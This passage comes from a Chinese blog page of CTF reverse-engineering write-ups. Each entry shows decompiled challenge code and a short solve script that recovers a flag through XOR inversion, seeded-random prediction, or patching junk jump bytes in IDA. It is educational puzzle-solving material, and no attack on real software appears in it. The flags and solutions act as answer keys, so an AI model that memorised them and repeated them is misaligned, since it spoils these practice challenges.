/>其中startaddr时初始地址，endaddr是结束地址，get_wide_byte()函数是常用的命令，含义是get_wide_byte(ea)/get_wide_dword/word(ea)create_data(ea, dataflag, size, tid)转变为数据(byte,word,dword,etc),patch_byte(addr,byte)是设置addr处的一个字节值（其他的ida命令可以参考一位大佬的文章</p><p>之后可以直接找到flag</p><p>65691</p><h4 id="非预期解"><a class="markdownIt-Anchor" href="#非预期解"></a> 非预期解</h4><p>65761</p><h3 id="exp-6"><a class="markdownIt-Anchor" href="#exp-6"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 利用idapython脚本解决重复工作</span>startaddr <span class="token operator">=</span> <span class="token number">0x1135</span>endaddr <span class="token operator">=</span> <span class="token number">0x3100</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>startaddr<span class="token punctuation">,</span>endaddr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> get_wide_byte<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xEB</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> get_wide_byte<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">:</span>            patch_byte<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Addr &#123;&#125; is patched"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="swpuctf-2021-新生赛fakerandom"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛fakerandom"></a> [SWPUCTF 2021 新生赛]fakerandom</h2><h3 id="题目描述xorfakerandom"><a class="markdownIt-Anchor" href="#题目描述xorfakerandom"></a> 题目描述(xor,fakerandom)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> randomflag <span class="token operator">=</span> <span class="token string">'xxxxxxxxxxxxxxxxxxxx'</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-7"><a class="markdownIt-Anchor" href="#exp-7"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#鼠鼠不会逆，只能根据异或的可逆性把答案给搞出来</span><span class="token keyword">import</span> randomflag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">]</span>result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#NSSCTF&#123;FakeE_random&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看了一眼标准解法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#本题考查的是python random模块的伪随机数相关的知识。所谓伪随机数就是设定种子之后，生成的随机数序列可以被预测（每次都一样的）。</span><span class="token comment">#random.seed(1) 是 Python 的 randm 模块中的一个函数，用于设置随机生成器的种子值</span><span class="token comment">#random.getrandbits() 是 Pytho 的 random 模块中的一个函数，用于生成定数量的随机位（bit）的整数。</span><span class="token keyword">import</span> randomrandom<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token comment">#l= [34, 145, 216, 205]</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token comment">#key = [135, 91, 149, 7, 215, 222, 193, 206, 108, 233, 219, 53, 164, 47, 181, 111, 123, 185, 25, 137]</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> ‘’<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="nisactf-2022string"><a class="markdownIt-Anchor" href="#nisactf-2022string"></a> [NISACTF 2022]string</h2><h3 id="题目描述-7"><a class="markdownIt-Anchor" href="#题目描述-7"></a> 题目描述</h3><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">char *__fastcall flag(char *a1)&#123;  char *v1; &#x2F;&#x2F; rax  char *v2; &#x2F;&#x2F; rax  char *v3; &#x2F;&#x2F; rax  int v4; &#x2F;&#x2F; eax  char *v6; &#x2F;&#x2F; [rsp+8h] [rbp-38h]  int i; &#x2F;&#x2F; [rsp+1Ch] [rbp-24h]  int j; &#x2F;&#x2F; [rsp+20h] [rbp-20h]  int k; &#x2F;&#x2F; [rsp+20h] [rbp-20h]  int v10; &#x2F;&#x2F; [rsp+24h] [rbp-1Ch]  int m; &#x2F;&#x2F; [rsp+28h] [rbp-18h]  int v12; &#x2F;&#x2F; [rsp+2Ch] [rbp-14h]  int v13; &#x2F;&#x2F; [rsp+34h] [rbp-Ch]  v6 &#x3D; a1;  v12 &#x3D; (_DWORD)a1 + 1;  if ( (_DWORD)a1 &lt;&lt; 30 )  &#123;    while ( 1 )    &#123;      v1 &#x3D; v6++;      if ( !*v1 )        break;      if ( !((_DWORD)v6 &lt;&lt; 30) )        goto LABEL_4;    &#125;  &#125;  else  &#123;LABEL_4:    for ( i &#x3D; (int)v6; ((i - 16843009) &amp; ~i &amp; 0x80808080) &#x3D;&#x3D; 0; i &#x3D; v13 )    &#123;      v13 &#x3D; v6[1];      v6 +&#x3D; 4;    &#125;    v2 &#x3D; v6++;    for ( j &#x3D; *v2; j; j &#x3D; *v3 )      v3 &#x3D; v6++;  &#125;  puts(&quot;This a magic!&quot;);  v10 &#x3D; (_DWORD)v6 - v12;  for ( k &#x3D; 0; (int)v6 - v12 &gt; k; ++k )    v10 ^&#x3D; 0x1Au;  if ( v10 !&#x3D; 13 )  &#123;    puts(&quot;error!&quot;);    exit(0);  &#125;  puts(&quot;The length of flag is 13&quot;);  srand(seed);  printf(&quot;NSSCTF&#123;&quot;);  for ( m &#x3D; 0; m &lt; 13; ++m )  &#123;    v4 &#x3D; rand();    printf(&quot;%d&quot;, (unsigned int)(v4 % 8 + 1));  &#125;  putchar(125);  return &amp;v6[-v12];&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-8"><a class="markdownIt-Anchor" href="#exp-8"></a> exp</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;int main(int argc, char const *argv[])&#123;int v4 &#x3D; 0;int seed &#x3D; 0x2766;srand(seed);for ( int l &#x3D; 0; l &lt; 13; ++l )&#123;v4 &#x3D; rand();printf(“%d”, (unsigned int)(v4 % 8 + 1));&#125;return 0;&#125;&#x2F;&#x2F;5353316611126<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>必须要linux写出来的程序得到的才是正确的答案，win的写出来是错的</p><p>这个是依赖于libc版本的, 如果libc的rand换了实现, 输出就变了</p><h2 id="nisactf-2022sign-ezc"><a class="markdownIt-Anchor" href="#nisactf-2022sign-ezc"></a> [NISACTF 2022]sign-ezc++</h2><h3 id="题目描述-8"><a class="markdownIt-Anchor" href="#题目描述-8"></a> 题目描述</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  Man *v3; &#x2F;&#x2F; rbx  Human *v4; &#x2F;&#x2F; rbx  std::string name; &#x2F;&#x2F; [rsp+20h] [rbp-20h] BYREF  char v7; &#x2F;&#x2F; [rsp+37h] [rbp-9h] BYREF  Human *m; &#x2F;&#x2F; [rsp+38h] [rbp-8h]  _main();  std::allocator&lt;char&gt;::allocator(&amp;v7);  std::string::string(&amp;name, &quot;NISACTF&quot;, &amp;v7);  v3 &#x3D; (Man *)operator new(0x18ui64);  Man::Man(v3, (std::string)&amp;name, 4);  m &#x3D; v3;  std::string::~string(&amp;name);  std::allocator&lt;char&gt;::~allocator(&amp;v7);  (*((void (__fastcall **)(Human *))m-&gt;_vptr_Human + 1))(m);  v4 &#x3D; m;  if ( m )  &#123;    Human::~Human(m);    operator delete(v4);  &#125;  return 0;&#125;&#x2F;&#x2F;主函数看不懂一点，随便点点看看有没有什么有用信息，可以在human这个类中找到giveflag函数&#x2F;&#x2F;点进去一看发现是一个数组与0xA0异或<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-9"><a class="markdownIt-Anchor" href="#exp-9"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"445959495E4C717E626379556379554443594B55786F5579636D6477"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">^</span><span class="token number">0xA</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#NSSCTF&#123;this_is_NISA_re_sign&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hnctf-2022-week1超级签到"><a class="markdownIt-Anchor" href="#hnctf-2022-week1超级签到"></a> [HNCTF 2022 Week1]超级签到</h2><h3 id="题目描述-9"><a class="markdownIt-Anchor" href="#题目描述-9"></a> 题目描述</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rcx</span>  <span class="token class-name">size_t</span> v5<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp+4h]</span>  <span class="token keyword">char</span> Str1<span class="token punctuation">[</span><span class="token number">224</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp+28h] BYREF</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+128h] [rbp+108h]</span>  v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">82</span>i64<span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">858993460</span><span class="token punctuation">;</span>    v3 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v10 <span class="token operator">=</span> j<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">></span> <span class="token function">j_strlen</span><span class="token punctuation">(</span>Str2<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> Str2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">111</span> <span class="token punctuation">)</span>      Str2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_1400111D1</span><span class="token punctuation">(</span><span class="token string">"input the flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%20s"</span><span class="token punctuation">,</span> Str1<span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token function">j_strlen</span><span class="token punctuation">(</span>Str2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>Str1<span class="token punctuation">,</span> Str2<span class="token punctuation">,</span> v5<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">sub_1400111D1</span><span class="token punctuation">(</span><span class="token string">"this is the right flag!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">sub_1400111D1</span><span class="token punctuation">(</span><span class="token string">"wrong flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//程序逻辑就是先替换然后再比较，很显然</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-10"><a class="markdownIt-Anchor" href="#exp-10"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token string">''</span>str2<span class="token operator">=</span><span class="token string">'&#123;hello_world&#125;'</span><span class="token keyword">for</span> char <span class="token keyword">in</span> str2<span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        char<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span>    flag<span class="token operator">+=</span>char<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># &#123;hell0_w0rld&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="litctf-2023ez_xor"><a class="markdownIt-Anchor" href="#litctf-2023ez_xor"></a> [LitCTF 2023]ez_XOR</h2><h3 id="题目描述-10"><a class="markdownIt-Anchor" href="#题目描述-10"></a> 题目描述</h3><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">__main();  strcpy(Str2, &quot;E&#96;&#125;J]OrQF[V8zV:hzpV&#125;fVF[t&quot;);  v9 &#x3D; 0;  v10 &#x3D; 0;  v11 &#x3D; 0;  v12 &#x3D; 0;  v13 &#x3D; 0;  v14 &#x3D; 0;  v15 &#x3D; 0;  printf(&quot;Enter The Right FLAG:&quot;);  scanf(&quot;%s&quot;, Str1);  XOR(Str1, 3);  if ( !strcmp(Str1, Str2) )  &#123;    printf(&quot;U Saved IT!\n&quot;);    return 0;  &#125;  else  &#123;    printf(&quot;Wrong!Try again!\n&quot;);    return main(v4, v5, v6);  &#125;&#x2F;&#x2F;XOR函数进去看是字符串每个字符异或3**3，逻辑很简单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-11"><a class="markdownIt-Anchor" href="#exp-11"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">"E`&#125;J]OrQF[V8zV:hzpV&#125;fVF[t"</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> char <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    i<span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">9</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># LitCTF&#123;XOR_1s_3asy_to_OR&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hnctf-2022-week2esy_flower"><a class="markdownIt-Anchor" href="#hnctf-2022-week2esy_flower"></a> [HNCTF 2022 WEEK2]e@sy_flower</h2><h3 id="题目描述-11"><a class="markdownIt-Anchor" href="#题目描述-11"></a> 题目描述</h3><p>把爆红的jmp花指令nop掉就能得到主函数的逻辑</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">v3 &#x3D; a1 - a2;  for ( i &#x3D; 0; i &lt; v3 &gt;&gt; 1; ++i )               &#x2F;&#x2F; 在循环内部，进行了一些对字符串的字节交换操作：就是奇数位和偶数位交换  &#123;    v5 &#x3D; *(_BYTE *)(a3 + 2 * i - 52);    *(_BYTE *)(a3 + 2 * i - 52) &#x3D; *(_BYTE *)(a3 + 2 * i - 51);    *(_BYTE *)(a3 + 2 * i - 51) &#x3D; v5;  &#125;  for ( j &#x3D; 0; j &lt; strlen((const char *)(a3 - 52)); ++j )&#x2F;&#x2F; 在第二个循环内部，对字符串中的每个字节执行异或操作，将其与0x30u（十进制为48）进行异或。    *(_BYTE *)(a3 + j - 52) ^&#x3D; 0x30u;  v7 &#x3D; strcmp((const char *)(a3 - 52), &quot;c~scvdzKCEoDEZ[^roDICUMC&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-12"><a class="markdownIt-Anchor" href="#exp-12"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">"c~scvdzKCEoDEZ[^roDICUMC"</span>a3_<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> char <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    a3_<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a3_<span class="token punctuation">)</span>a3<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>a3_<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>a3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>a3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># SNCSFTJ&#123;su_tujknB_tyse&#125;s</span><span class="token comment"># NSSCTF&#123;Just_junk_Bytess&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="bjdctf-2020justre"><a class="markdownIt-Anchor" href="#bjdctf-2020justre"></a> [BJDCTF 2020]JustRE</h2><h3 id="题目描述-12"><a class="markdownIt-Anchor" href="#题目描述-12"></a> 题目描述</h3><p>shift+f12查找字符串，看到一个BJD开头的像flag的东西，直接交叉引用，来到giveflag的函数</p><pre 